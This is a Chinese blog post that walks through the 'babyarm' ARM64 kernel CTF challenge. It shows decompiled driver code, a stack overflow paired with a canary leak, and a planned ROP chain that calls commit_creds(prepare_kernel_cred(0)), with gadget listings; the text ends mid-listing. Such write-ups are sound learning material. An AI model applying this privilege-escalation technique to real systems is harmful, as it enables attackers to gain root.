@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="babyarm 复现 12345678910timeout --foreground 60 qemu-system-aarch64 \    -m 128M \    -machine virt \    -cpu max \    -kernel .&#x2F;Image \    -append &quot;console&#x3D;ttyAMA0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1&amp;qu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ARM kernel pwn初探">
+<meta property="og:url" content="http://example.com/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="babyarm 复现 12345678910timeout --foreground 60 qemu-system-aarch64 \    -m 128M \    -machine virt \    -cpu max \    -kernel .&#x2F;Image \    -append &quot;console&#x3D;ttyAMA0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1&amp;qu">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-14T15:41:45.000Z">
+<meta property="article:modified_time" content="2023-03-14T15:43:06.020Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="ARM">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ARM kernel pwn初探 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/14/ARM%20kernel%20pwn%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ARM kernel pwn初探
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-03-14 23:41:45 / Modified: 23:43:06" itemprop="dateCreated datePublished" datetime="2023-03-14T23:41:45+08:00">2023-03-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>9.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>babyarm 复现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timeout --foreground 60 qemu-system-aarch64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -machine virt \</span><br><span class="line">    -cpu max \</span><br><span class="line">    -kernel ./Image \</span><br><span class="line">    -append &quot;console=ttyAMA0 loglevel=3 oops=panic panic=1&quot; \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
+<ul>
+<li>没有给定<code>nokaslr</code>，默认开启地址随机化 </li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/demo.ko</span><br><span class="line">chown -R 1000:1000 /home/pwn</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
+<ul>
+<li>dmesg_restrict</li>
+<li>kptr_restrict</li>
+<li>perf_event_paranoid</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<p>IDA 分析内核模块发现就只有 <code>device_write</code> 和 <code>device_read</code> 有用，但这两个函数都很乱</p>
+<p>再加上对 ARM 架构不熟悉，逆向的过程花费了我不少时间，下面是我的思考过程：</p>
+<p>函数 <code>device_write</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v21; <span class="comment">// [xsp+B8h] [xbp+B8h]</span></span><br><span class="line"></span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">v21 = *(_QWORD *)(StatusReg + <span class="number">0x480</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>从位置上开看 v21 应该是 canary</li>
+<li>那前面的 <code>_ReadStatusReg(ARM64_SYSREG(3, 0, 4, 1, 0))</code> 就是用来生成 canary 的</li>
+</ul>
+<p>然后就到了我感觉最抽象的一段代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v19 = *(_QWORD *)StatusReg, v8 = (<span class="keyword">unsigned</span> __int64)buf, (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v9 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v8, len);</span><br><span class="line">v11 = v8 + len;</span><br><span class="line"><span class="keyword">if</span> ( v11 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v9 = <span class="number">0LL</span>;                                   <span class="comment">// △</span></span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v11 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v11 != v9 + !_CF) &amp; __CFSUB__(v11, v9, _CF) )</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span>                                          <span class="comment">// △</span></span><br><span class="line">  v12 = <span class="number">1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v12 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buf &amp; ((__int64)((_QWORD)buf &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = buf;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v17 = _arch_copy_from_user(demo_buf, v13, len);<span class="comment">// 成功返回&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v17 )                                    <span class="comment">// △</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;demo_buf[len - v17], <span class="number">0</span>, v17);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;                <span class="comment">// 返回错误码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  _memcpy(tmp, demo_buf);</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>demo_buf</code> 的范围远比 <code>tmp</code> 大，因此有栈溢出</li>
+</ul>
+<p>这段代码有很多未命名变量，宏定义，还有很多 if-else 语句，但我们可以从后向前分析：</p>
+<ul>
+<li>为了不让程序返回错误码 0xFFFFFFFFFFFFFFEALL，以上各个 if-else 语句都只能按照 “△” 标注的路线回溯</li>
+<li>直到第一个 if 执行：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">0x2C</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">    || (v19 = *(_QWORD *)StatusReg, </span><br><span class="line">        v8 = (<span class="keyword">unsigned</span> __int64)buf, </span><br><span class="line">        (v19 &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>
+<p>感觉程序在检查一些环境，没有实质性的操作，写一个 test.c 进行调试：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_sp_v;</span><br><span class="line"><span class="keyword">size_t</span> *user_sp = &amp;user_sp_v;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/demo&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以通过 <code>/sys/module/demo/sections/.text</code> 获取模块 <code>.text</code> 基地址</li>
+</ul>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>pwn # cat <span class="regexp">/sys/m</span>odule<span class="regexp">/demo/</span>sections/.text</span><br><span class="line"><span class="number">0</span>xffffbcf41c9e3000</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffbe24d4559090</span>    bl     #<span class="number">0xffffbe24da88b200</span>           &lt;<span class="number">0xffffbe24da88b200</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0xffffbe24da88b200</span>    hint   #<span class="number">0x22</span></span><br><span class="line">  <span class="number">0xffffbe24da88b204</span>    add    x5, x0, x2</span><br><span class="line">  <span class="number">0xffffbe24da88b208</span>    mov    x15, x1</span><br><span class="line">  <span class="number">0xffffbe24da88b20c</span>    mov    x6, x0</span><br><span class="line">  <span class="number">0xffffbe24da88b210</span>    cmp    x2, #<span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>其实到 <code>_arch_copy_from_user(demo_buf, v13, len)</code> 执行之前的操作都没有什么影响，可以直接忽略</li>
+</ul>
+<p>函数 <code>device_read</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">canary = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>)) + <span class="number">0x480</span>);</span><br><span class="line"><span class="keyword">if</span> ( length &gt; <span class="number">0x1000</span> )</span><br><span class="line">  <span class="keyword">return</span> device_read_0((file *)length, buffer, length, <span class="number">0LL</span>);</span><br><span class="line">_memcpy(demo_buf, tmp);</span><br><span class="line">StatusReg = _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">if</span> ( (*(_DWORD *)(StatusReg + <span class="number">44</span>) &amp; <span class="number">0x200000</span>) != <span class="number">0</span></span><br><span class="line">  || (v7 = (<span class="keyword">unsigned</span> __int64)buffer, (*(_QWORD *)StatusReg &amp; <span class="number">0x4000000</span>) != <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v8 = <span class="number">0xFFFFFFFFFFFF</span>LL;</span><br><span class="line">_CF = __CFADD__(v7, length);</span><br><span class="line">v10 = v7 + length;</span><br><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">0</span> &amp;&amp; _CF )</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( _CF )</span><br><span class="line">  v10 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( (v10 != v8 + !_CF) &amp; __CFSUB__(v10, v8, _CF) )</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v11 = <span class="number">1LL</span>;</span><br><span class="line">v12 = length;</span><br><span class="line"><span class="keyword">if</span> ( v11 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int64)buffer &amp; ((__int64)((_QWORD)buffer &lt;&lt; <span class="number">8</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFFFF000000000000</span>LL) != <span class="number">0</span> )</span><br><span class="line">    v15 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = buffer;</span><br><span class="line">  __asm &#123; HINT            #<span class="number">0x14</span> &#125;</span><br><span class="line">  v12 = _arch_copy_to_user(v15, demo_buf, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>由于 tmp 和 canary 靠得很近，这里可以把 canary 拷贝到 demo_buf 中</li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>栈溢出和泄露 canary 都很简单，关键是怎么提取并且回到用户态</p>
+<p>程序开了 smep 因此只能写 ROP，第一个 gadget 需要完成栈迁移的工作</p>
+<p>常规获取 gadget 的工具 ropper/ROPgadget 不能使用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filebytes.binary.BinaryError: Bad architecture</span><br><span class="line">ropper --file ./Image --nocolor &gt; g1  <span class="number">0.40</span>s user <span class="number">0.09</span>s system <span class="number">99</span>% cpu <span class="number">0.491</span> total</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Error] PE.getArch() - Bad Arch</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这就需要手动找 Gadget 了</li>
+</ul>
+<p>内核里有个好用的 gadget：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000016950 00 00 80 52                   MOV             W0, #0</span><br><span class="line">.text:0000000000016954 F3 53 41 A9                   LDP             X19, X20, [SP,#0x50+var_40]</span><br><span class="line">.text:0000000000016958 F5 5B 42 A9                   LDP             X21, X22, [SP,#0x50+var_30]</span><br><span class="line">.text:000000000001695C F7 63 43 A9                   LDP             X23, X24, [SP,#0x50+var_20]</span><br><span class="line">.text:0000000000016960 F9 23 40 F9                   LDR             X25, [SP,#0x50+var_10]</span><br><span class="line">.text:0000000000016964 FD 7B C5 A8                   LDP             X29, X30, [SP+0x50+var_50],#0x50</span><br><span class="line">.text:0000000000016968 C0 03 5F D6                   RET</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里有一个小坑需要注意：ARM 的 ret 指令和 x86 的有很大不同</p>
+<ul>
+<li>执行 ret 之后，会把 LR 寄存器里的值赋值给 PC（注意，不是栈）</li>
+</ul>
+<p>因此构造 ROP 链时的核心就是通过栈来控制 LR(X30) 寄存器：</p>
+<ul>
+<li>控制 X19 为 <code>prepare_kernel_cred+4</code></li>
+<li>控制 X30 为 <code>commit_creds+4</code></li>
+<li>执行 ret 时就可以执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
+</ul>
+<p>后续需要考虑返回用户态的问题：</p>
+<p>ARM64使用 <code>SVC</code> 指令进入内核态，使用 <code>ERET</code> 指令返回用户态，ARM 在进入内核态之前会保存用户态所有寄存器状态，在返回时恢复</p>
+<p>其中比较重要的寄存器有 SP_EL0、ELR_EL1、SPSR_EL1：</p>
+<ul>
+<li>SP_EL0：保存用户态的栈指针</li>
+<li>ELR_EL1：保存要返回的用户态 PC 指针</li>
+<li>SPSR_EL1：保存 0x80001000</li>
+</ul>
+<p>可以用下面这个 gadget 来填充上述数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000011F</span>E4 <span class="number">17</span> <span class="number">41</span> <span class="number">18</span> D5                   MSR             #<span class="number">0</span>, c4, c1, #<span class="number">0</span>, X23 <span class="comment">/* msr	sp_el0, x23 */</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>E8 DF <span class="number">02</span> <span class="number">7</span>C F2                   TST             X22, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000011F</span>EC <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span>                   B.EQ            loc_11FF4</span><br><span class="line">.text:<span class="number">0000000000011F</span>EC</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0 <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">0000000000011F</span>F0</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4                               loc_11FF4                               ; CODE XREF: sub_157D0<span class="number">-37E4</span>↑j</span><br><span class="line">.text:<span class="number">0000000000011F</span>F4 <span class="number">80</span> B7 <span class="number">46</span> F9                   LDR             X0, [X28,#<span class="number">0xD68</span>]</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8 <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span>                   B               loc_12024</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8</span><br><span class="line">.text:<span class="number">0000000000011F</span>F8                               ; END OF FUNCTION CHUNK FOR sub_157D0</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               sub_11FFC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC</span><br><span class="line">.text:<span class="number">0000000000011F</span>FC                               ; FUNCTION CHUNK AT .text:<span class="number">0000000000012024</span> 